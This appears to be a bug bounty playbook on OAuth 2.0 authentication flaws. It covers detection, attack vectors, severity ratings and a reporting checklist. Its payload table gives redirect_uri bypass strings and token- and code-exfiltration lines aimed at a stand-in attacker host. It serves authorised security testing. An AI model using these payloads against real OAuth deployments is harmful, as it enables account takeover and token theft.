# OAuth 2.0 — Bug Bounty Playbook

> Source: PortSwigger Web Security Academy — "OAuth 2.0 authentication vulnerabilities" (+ Hidden OAuth Attack Vectors research).
> Flows: **authorization code** (code via browser → token on server back-channel) vs **implicit** (all in browser; token in URL fragment, JS-read, often POSTed & implicitly trusted). Loose spec, most security optional ⇒ misconfig-rich.

## 1. Quick Detection
- "Log in with X" option → proxy through Burp, replay full flow.
- First flow request always hits the OAuth server's `/authorization` endpoint:
`GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24`

| Signal | Meaning |
|---|---|
| `response_type=code` / `=token` | authorization code flow / implicit flow (juicier — token via browser) |
| `scope=openid …` | OpenID Connect layer present |
| missing/weak `state` | CSRF candidate for login/linking |
| provider hostname | read provider docs: endpoint names + config |

- Recon: fetch `/.well-known/oauth-authorization-server` + `/.well-known/openid-configuration` → JSON config exposes undocumented endpoints/features (wider surface); issuer/`request_uri` URLs = SSRF pivots.
- OIDC: probe dynamic client registration (registration_endpoint). Unprotected = register own client app.
- Enumerate accepted `redirect_uri` values: strip/add paths, queries, fragments; map validation.

## 2. Attack Vectors

| # | Vector | Technique |
|---|---|---|
| A1 | redirect_uri bypass | See §3 table: prefix-match abuse, parser confusion, dup params, localhost, response_mode tricks |
| A2 | ATO via subdomain redirect | Validation allows `*.client-app.com`; take over a subdomain → host page capturing code/token |
| A3 | Missing `state` → CSRF | Attacker starts flow, victim's browser completes it. (a) Linking hijack: site has password login + social linking → victim's account bound to attacker's social account. (b) Login CSRF: victim logged into attacker's account |
| A4 | Code interception | Steal victim's code pre-use → send to legit `/callback`; client completes exchange, logs attacker into victim's acct. state/nonce useless (attacker mints own). Blocked only if exchange re-checks redirect_uri |
| A5 | Implicit param swap | Client POSTs `{email/user_id, access_token}` from browser and trusts it (no secret to verify) → swap identity, keep valid token ⇒ impersonate any user |
| A6 | Steal via proxy page | No external redirect_uri? Traversal `/oauth/callback/../../any/path` → any whitelisted-domain page. Audit it for: open redirect (fwd victim+code/token out), XSS (code/token = own session, outlasts tab, bypasses HttpOnly), JS/web-messaging on query/fragment (gadget chains), HTML injection → `<img src="evil-user.net">` leaks Referer w/ query string (Firefox) = JS-free code theft |
| A7 | Implicit token leakage | Need fragment extractor (open redirect can't read fragment). Stolen token ⇒ direct API calls to `/userinfo`/resource server — data beyond client UI |
| A8 | Scope upgrade — code flow | Register malicious client, request `openid email`; at `POST /token` append `scope=openid%20email%20profile` → upgraded token if server doesn't validate vs initial authz request |
| A9 | Scope upgrade — implicit | Steal token from innocent client → browser request to `/userinfo` with added `scope` param; works while ≤ client's granted access |
| A10 | Unverified registration | Provider skips email verification → register with victim's known email; client maps by email ⇒ login as victim |
| A11 | Access control / config | `.well-known` disclosure; authz requests by reference — `request_uri`/issuer URLs fetched server-side → SSRF |

## 3. Payload / Bypass Table

| Bypass | Payload |
|---|---|
| Prefix/startswith check | `https://client-app.com/callback@evil-user.net` or arbitrary path/query/fragment appended to approved prefix |
| Path traversal | `https://client-app.com/oauth/callback/../../example/path` |
| Parser confusion (list-append) | `https://default-host.com&@foo.evil-user.net#@bar.evil-user.net/` |
| Param pollution | `?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net` |
| localhost dev trust | register `localhost.evil-user.net` |
| response_mode shift | `response_mode=fragment` (changes redirect_uri parsing) / `web_message` (often allows wider subdomains) |
| Code exfil (no JS) | injected `<img src="https://evil-user.net">` on page receiving code → Referer leak |
| Token exfil | open redirect/JS relay: `…/rd?u=https://evil-user.net` reading `location.hash` |

Combine parameter changes — altering one can change how others are validated.

## 4. By-Design Filters (SKIP)
- `state` session-bound + validated server-side.
- Exact-match redirect_uri whitelist, re-checked at token exchange (back-channel).
- PKCE/nonce enforced.
- Implicit POST: token cryptographically verified against submitted identity.
- Provider verifies emails; account linking requires password re-auth.

## 5. Severity Guide

| Finding | Severity |
|---|---|
| ATO via redirect_uri bypass / implicit param swap / subdomain redirect | Critical |
| Code/token theft via open redirect, XSS relay, Referer leak | High |
| Account-linking CSRF (missing state) | High |
| Unverified email registration → ATO | High |
| Scope upgrade (either flow) | Medium |
| Login CSRF only | Low–Medium |
| Config/endpoint disclosure via `.well-known` | Info–Low |

## 6. Reporting Checklist
- [ ] Flow type (code vs implicit) + grant-specific impact
- [ ] Full request/response chain, every modified parameter
- [ ] Proven impact in YOUR browser (login as victim / read data) — screenshots, not theory
- [ ] Which protection failed & why (state? exchange redirect check?)
- [ ] Fix: exact-match whitelist, state+PKCE, exchange-time redirect_uri check, verified emails, token-vs-identity validation
- [ ] Own test accounts only; stop at proof of impact

> ⚠️ Blocked/unproven exploit chain = INFORMATIONAL per master KB rule. Never claim HIGH/CRIT from theory alone.
